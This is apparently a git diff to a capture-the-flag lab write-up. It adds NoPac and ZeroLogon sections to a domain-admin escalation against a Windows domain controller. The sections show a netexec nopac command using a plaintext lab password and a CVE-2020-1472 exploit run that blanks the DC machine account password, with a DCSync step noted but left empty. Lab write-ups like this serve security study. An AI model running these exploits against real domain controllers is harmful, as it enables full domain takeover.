@@ -177,7 +177,8 @@ SMB         10.129.18.9     445    CASC-DC1         [+] cascade.local\r.thompson
 ```
 This user is compromised
 
-# Domain admin (Unintended)
+# Domain admin (Unintendeds)
+## NoPac
 ```python
 nxc smb casc-dc1.cascade.local -u 'r.thompson' -p 'rY4n5eva' -M nopac               
 SMB         10.129.18.9     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
@@ -262,5 +263,22 @@ C:\Windows\system32>
 ```
 
 
+## ZeroLogon
+```python
+python3 cve-2020-1472-exploit.py casc-dc1 10.129.18.9 
+Performing authentication attempts...
+========================================================================================================================================================================================================================================================================================================================================================================================================
+Target vulnerable, changing account password to empty string
 
+Result: 0
+
+Exploit complete!
+```
+This set the DC machine account password to null
+
+Now i can do a DCSync
+
+```python
+
+```
 
